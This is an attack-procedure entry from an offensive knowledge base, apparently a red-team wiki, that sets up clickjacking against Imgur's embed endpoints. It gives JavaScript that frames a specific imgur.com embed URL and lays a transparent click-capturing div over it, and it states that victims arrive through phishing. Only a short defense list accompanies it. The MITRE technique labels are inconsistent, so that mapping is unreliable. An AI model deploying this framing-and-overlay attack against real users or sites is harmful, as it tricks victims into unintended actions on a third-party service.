---
id: proc-imgur-clickjack-setup
tags:
  - clickjacking
  - iframe
  - x-frame-options
type: procedure
tools:
  - '[[tools/firefox-browser]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/load-iframe-with-imgur-embed]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T03:47:13.057Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Setup ClickJacking Iframe for Imgur Embed

## Summary

This procedure sets up a malicious page to frame Imgur's embed endpoints, exploiting missing X-Frame-Options to overlay invisible UI for tricking users into unintended actions like navigating to the upload page.

## Description

The attack targets Imgur's /a/IMAGE_ID/embed/embed endpoints, which do not enforce X-Frame-Options properly, allowing the main domain to be framed. This enables clickjacking where the attacker overlays elements to simulate interactions. Prerequisites include hosting a malicious HTML page accessible to the victim, and the victim using a vulnerable browser like Firefox. Expected outcome: Victim's browser loads the framed Imgur page without restrictions, setting up for further chaining.

## Requirements

1. Malicious web server to host the attack page (e.g., local Python server)
2. Victim access to the attack page via link or phishing
3. Firefox browser for full chain compatibility
4. No authentication needed for embed viewing

## Defense

Defensive measures and detection strategies:

- Enforce strict X-Frame-Options: DENY or SAMEORIGIN on all endpoints
- Monitor for unusual iframe sourcing from embeds
- User training on suspicious drag-and-drop prompts
- Browser extensions to detect clickjacking overlays

## Objectives

1. Frame Imgur embed without blocking to enable UI manipulation
2. Position for user interaction tricking
3. Prepare for page navigation detection

## Instructions

### Step 1: Create Malicious HTML Page

**Context**: Build the base page with an iframe targeting the vulnerable Imgur embed.

**Command** ([[commands/load-iframe-with-imgur-embed]]):
```javascript
let ifr = document.createElement('iframe');
ifr.src = 'http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540';
document.body.appendChild(ifr);
ifr.onload = function() { console.log('Iframe loaded for clickjacking'); };
```

> This creates and loads the iframe. Expected output: Iframe renders Imgur content; console log confirms load. Success if no framing error.

### Step 2: Overlay Invisible Elements

**Context**: Add transparent divs over the iframe to capture clicks and simulate navigation to upload.

**Command** (Custom JS overlay):
```javascript
let overlay = document.createElement('div');
overlay.style.position = 'absolute';
overlay.style.top = '0'; overlay.style.left = '0';
overlay.style.width = '100%'; overlay.style.height = '100%';
overlay.style.opacity = '0';
overlay.onclick = function() { /* Trigger navigation */ };
document.body.appendChild(overlay);
```

> Overlays the iframe for click capture. Expected output: Clicks on overlay manipulate iframe content.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Steal Web Session Cookie]] Drive-By Compromise

### Sub-Techniques

- None

## Commands Used

- [[commands/load-iframe-with-imgur-embed]]

## Tools Used

- [[tools/firefox-browser]]

## Tags

- clickjacking
- iframe-framing
